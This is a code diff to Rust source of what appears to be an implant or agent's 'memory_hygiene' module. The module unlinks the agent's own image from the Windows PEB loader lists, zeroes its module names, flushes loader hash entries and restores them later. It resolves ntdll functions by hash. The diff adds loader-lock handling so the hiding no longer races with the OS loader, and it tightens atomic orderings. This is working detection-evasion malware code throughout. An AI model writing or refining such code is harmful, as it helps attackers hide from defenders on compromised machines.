@@ -337,6 +337,85 @@ fn current_thread_handle() -> usize {
     (-2isize) as usize
 }
 
+// ── PEB Loader Lock helpers ──────────────────────────────────────────────────
+
+/// Acquire the Windows LDR loader lock via `RtlEnterCriticalSection`.
+///
+/// The loader lock serialises all module list mutations (loads, unloads, and
+/// list walks).  Holding it while we unlink our entry prevents a TOCTOU race
+/// where the OS loader walks the list between our read of Flink/Blink and our
+/// write-back, which would corrupt the list and crash the process.
+///
+/// Returns `Some(critical_section_ptr)` on success, `None` if resolution fails.
+unsafe fn acquire_loader_lock() -> Option<usize> {
+    let ntdll = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)?;
+    let func_addr = pe_resolve::get_proc_address_by_hash(
+        ntdll,
+        pe_resolve::hash_str(b"RtlEnterCriticalSection\0"),
+    )?;
+
+    // Read the CriticalSection pointer from PEB_LDR_DATA.
+    // PEB_LDR_DATA layout (x64):
+    //   +0x00  Length
+    //   +0x04  Initialized
+    //   +0x08  SsHandle
+    //   +0x10  InLoadOrderModuleList       (LIST_ENTRY, 16 bytes)
+    //   +0x20  InMemoryOrderModuleList     (LIST_ENTRY, 16 bytes)
+    //   +0x30  InInitializationOrderModuleList (LIST_ENTRY, 16 bytes)
+    //   +0x40  EntryInProgress             (PVOID)
+    //   +0x48  ShutdownInProgress          (BOOLEAN)
+    //   +0x4C  ShutdownThreadId            (ULONG)
+    //   +0x50  (padding to 8-byte align)
+    //   +0x58  CriticalSection             (PRTL_CRITICAL_SECTION)
+    //
+    // The CriticalSection field points to the loader lock
+    // (ntdll!LdrpLoaderLock).
+    const OFF_LDR_CRITICAL_SECTION: usize = 0x58;
+
+    let ldr = get_ldr();
+    if ldr.is_null() {
+        return None;
+    }
+
+    let cs_ptr = *(ldr.add(OFF_LDR_CRITICAL_SECTION) as *const usize);
+    if cs_ptr == 0 {
+        return None;
+    }
+
+    let func: extern "system" fn(usize) -> i32 = std::mem::transmute(func_addr);
+    func(cs_ptr);
+
+    Some(cs_ptr)
+}
+
+/// Release the Windows LDR loader lock via `RtlLeaveCriticalSection`.
+///
+/// # Safety
+///
+/// `cs_ptr` must be the value returned by [`acquire_loader_lock`].
+unsafe fn release_loader_lock(cs_ptr: usize) {
+    let ntdll = match pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL) {
+        Some(h) => h,
+        None => {
+            tracing::error!("[memory_hygiene] failed to resolve ntdll for loader lock release");
+            return;
+        }
+    };
+    let func_addr = match pe_resolve::get_proc_address_by_hash(
+        ntdll,
+        pe_resolve::hash_str(b"RtlLeaveCriticalSection\0"),
+    ) {
+        Some(a) => a,
+        None => {
+            tracing::error!("[memory_hygiene] failed to resolve RtlLeaveCriticalSection");
+            return;
+        }
+    };
+
+    let func: extern "system" fn(usize) -> i32 = std::mem::transmute(func_addr);
+    func(cs_ptr);
+}
+
 // ── Core scrubbing functions ─────────────────────────────────────────────────
 
 /// Scrub PEB LDR module list traces for the agent's own image.
@@ -410,6 +489,12 @@ pub unsafe fn scrub_peb_traces() {
 
     let entry_ptr = found_entry as *mut u8;
 
+    // ── Acquire the LDR loader lock before mutating any LDR structures ────
+    // This prevents TOCTOU corruption if the OS loader walks or mutates the
+    // module lists concurrently (e.g. during a DLL load/unload on another
+    // thread).
+    let _loader_lock = acquire_loader_lock();
+
     // ── 2. Zero FullDllName and BaseDllName buffer contents ───────────────
     zero_unicode_string_buffer(entry_ptr.add(OFF_FULL_DLL_NAME));
     zero_unicode_string_buffer(entry_ptr.add(OFF_BASE_DLL_NAME));
@@ -424,6 +509,11 @@ pub unsafe fn scrub_peb_traces() {
 
     // ── 6. Flush LDR hash table entries ───────────────────────────────────
     flush_ldr_hash_table(ldr, image_base);
+
+    // ── Release the LDR loader lock ───────────────────────────────────────
+    if let Some(cs_ptr) = _loader_lock {
+        release_loader_lock(cs_ptr);
+    }
 
     // Store saved links in thread-local.
     SAVED_PEB_LINKS.with(|sl| {
@@ -568,6 +658,9 @@ unsafe fn flush_ldr_hash_table(ldr: *mut u8, image_base: usize) {
 /// while we were unlinked, the neighbours may have changed.  We re-validate
 /// before restoring.
 pub unsafe fn restore_peb_traces() {
+    // Acquire the LDR loader lock before re-linking any LDR entries.
+    let _loader_lock = acquire_loader_lock();
+
     SAVED_PEB_LINKS.with(|sl| {
         let saved = sl.borrow();
         if !saved.saved {
@@ -619,6 +712,11 @@ pub unsafe fn restore_peb_traces() {
             *((saved.hash_flink + 8) as *mut usize) = hash_ptr as usize;
         }
     });
+
+    // Release the LDR loader lock.
+    if let Some(cs_ptr) = _loader_lock {
+        release_loader_lock(cs_ptr);
+    }
 
     tracing::info!("[memory_hygiene] PEB traces restored");
 }
@@ -1087,9 +1185,9 @@ impl Default for HygieneConfig {
 /// Set the hygiene interval (in seconds).  0 means "use default".
 pub fn set_hygiene_interval(secs: u64) {
     if secs == 0 {
-        HYGIENE_INTERVAL_SECS.store(DEFAULT_HYGIENE_INTERVAL_SECS, Ordering::Relaxed);
+        HYGIENE_INTERVAL_SECS.store(DEFAULT_HYGIENE_INTERVAL_SECS, Ordering::Release);
     } else {
-        HYGIENE_INTERVAL_SECS.store(secs, Ordering::Relaxed);
+        HYGIENE_INTERVAL_SECS.store(secs, Ordering::Release);
     }
 }
 
@@ -1110,8 +1208,8 @@ pub unsafe fn periodic_hygiene(config: &HygieneConfig) -> bool {
         .unwrap_or_default()
         .as_secs();
 
-    let interval = HYGIENE_INTERVAL_SECS.load(Ordering::Relaxed);
-    let last = LAST_HYGIENE_RUN.load(Ordering::Relaxed);
+    let interval = HYGIENE_INTERVAL_SECS.load(Ordering::Acquire);
+    let last = LAST_HYGIENE_RUN.load(Ordering::Acquire);
 
     if last != 0 && now.saturating_sub(last) < interval {
         return false; // Not enough time has elapsed.
@@ -1140,7 +1238,7 @@ pub unsafe fn periodic_hygiene(config: &HygieneConfig) -> bool {
         // actively closes handles each run.
     }
 
-    LAST_HYGIENE_RUN.store(now, Ordering::Relaxed);
+    LAST_HYGIENE_RUN.store(now, Ordering::Release);
 
     re_applied
 }
